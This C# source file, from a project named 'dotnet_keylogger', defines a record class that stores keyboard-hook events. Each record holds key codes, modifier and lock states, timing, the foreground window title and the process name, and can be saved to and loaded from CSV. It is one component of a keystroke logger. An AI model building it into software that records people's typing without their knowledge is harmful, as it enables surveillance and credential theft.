using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms; /// need for Keys
using System.Runtime.InteropServices; /// need for lParam

namespace dotnet_keylogger
{
    public class keylog
    {
        /* timestamp
         * diff in ms since last event
         * key pressed
         * scan code
         * raw key flags
         * system_keys for whats active at time of event -> 8 bits
         *  - Scroll Lock
         *  - Num Lock
         *  - CAPS Lock
         *  - Left Alt
         *  - Right Alt
         *  - Left Shift
         *  - Right Shift
         *  - Win
         * foreground window title
         * foreground window process name
         */
        public DateTime Timestamp { get; }
        public long LastKeyLatency { get; }
        public int vkCode { get; }
        public string Key { get; }
        public int ScanCode { get; }
        public int Raw_flags { get; }
        public byte Flags { get; }
        public string WindowTitle { get; }
        public string WindowName { get; }
        public bool IsCapital { get; }
        public bool init { get; }
        public static char delimeter = ',';
        public static string[] CSV_elements = {
                "timestamp",
                "last_key_latency",
                "vkcode",
                "key",
                "scan_code",
                "raw_flags",
                "modifier_flags",
                "scroll_lock",
                "num_lock",
                "caps_lock",
                "left_alt_key",
                "right_alt_key",
                "left_shift_key",
                "right_shift_key",
                "windows_key",
                "window_title",
                "window_name",
                "is_capital"
            };

        public bool IsItCapital()
        {
            /// 0xSCROLL.NUM.CAPS.LEFT_ALT.RIGHT_ALT.LEFT_SHIFT.RIGHT_SHIFT.WIN
            if ((this.Flags & (byte)0b0010_0110) == 0b0010_0000) ///if caps lock and not shift
            { return true; }
            if ((this.Flags & (byte)0b0010_0100) == 0b0000_0100) ///if not caps lock and left shift
            { return true; }
            if ((this.Flags & (byte)0b0010_0010) == 0b0000_0010) ///if not caps lock and left shift
            { return true; }
            ///if shift and not caps lock
            return false;
        }

        public keylog(DateTime timestamp, long lastkeylatency, IntPtr lParam, byte flags, 
            string WindowTitle, string WindowName)
        {
            this.Timestamp = timestamp;
            this.LastKeyLatency = lastkeylatency;
            this.vkCode = Marshal.ReadInt32(lParam);
            this.Key = ((Keys)this.vkCode).ToString();
            this.ScanCode = Marshal.ReadInt32(lParam + 4);
            this.Raw_flags = Marshal.ReadInt32(lParam + 8);
            this.Flags = flags;
            this.IsCapital = this.IsItCapital();
            this.WindowTitle = WindowTitle;
            this.WindowName = WindowName;
            this.init = true;
        }
        public keylog(string CSV_line)
        {
            string[] elements = CSV_line.Split(keylog.delimeter);
            if (elements.Length != keylog.CSV_elements.Length)
            {
                throw new System.ArgumentException("CSV line no good");
            }

            this.Timestamp = Convert.ToDateTime(elements[0]);
            this.LastKeyLatency = (long) Int32.Parse(elements[1]);
            this.vkCode = Int32.Parse(elements[2]);
            this.Key = elements[3];
            this.ScanCode = Int32.Parse(elements[4]);
            this.Raw_flags = Int32.Parse(elements[5]);
            this.Flags = (byte) Int32.Parse(elements[6]);
            /*
             * int i = elements[7].Equals("True")? 1:0; this.Flags = (byte) (this.Flags + (i >> 7));
            i = elements[8].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 6));
            i = elements[9].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 5));
            i = elements[10].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 4));
            i = elements[11].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 3));
            i = elements[12].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 2));
            i = elements[13].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 1));
            i = elements[14].Equals("True") ? 1 : 0; this.Flags = (byte)(this.Flags + (i >> 0));
            */
            this.WindowTitle = elements[15];
            this.WindowName = elements[16];
            this.IsCapital = elements[17] == "True"; // if not "true" then false
            this.init = true;
        }

        public string ToCSV()
        {
            string[] elements = {
                this.Timestamp.ToString("o"),
                this.LastKeyLatency.ToString("D3"),
                this.vkCode.ToString(),
                this.Key,
                this.ScanCode.ToString(),
                this.Raw_flags.ToString(),
                this.Flags.ToString(),
                ((this.Flags & (1 << 7)) != 0).ToString(),
                ((this.Flags & (1 << 6)) != 0).ToString(),
                ((this.Flags & (1 << 5)) != 0).ToString(),
                ((this.Flags & (1 << 4)) != 0).ToString(),
                ((this.Flags & (1 << 3)) != 0).ToString(),
                ((this.Flags & (1 << 2)) != 0).ToString(),
                ((this.Flags & (1 << 1)) != 0).ToString(),
                ((this.Flags & (1 << 0)) != 0).ToString(),
                this.WindowTitle,
                this.WindowName,
                this.IsCapital.ToString()
            };
            return (String.Join(keylog.delimeter.ToString(), elements));
        }   

        public static string OutCSVHeader()
        {
            return (String.Join(keylog.delimeter.ToString(),keylog.CSV_elements));
        }
    }
}
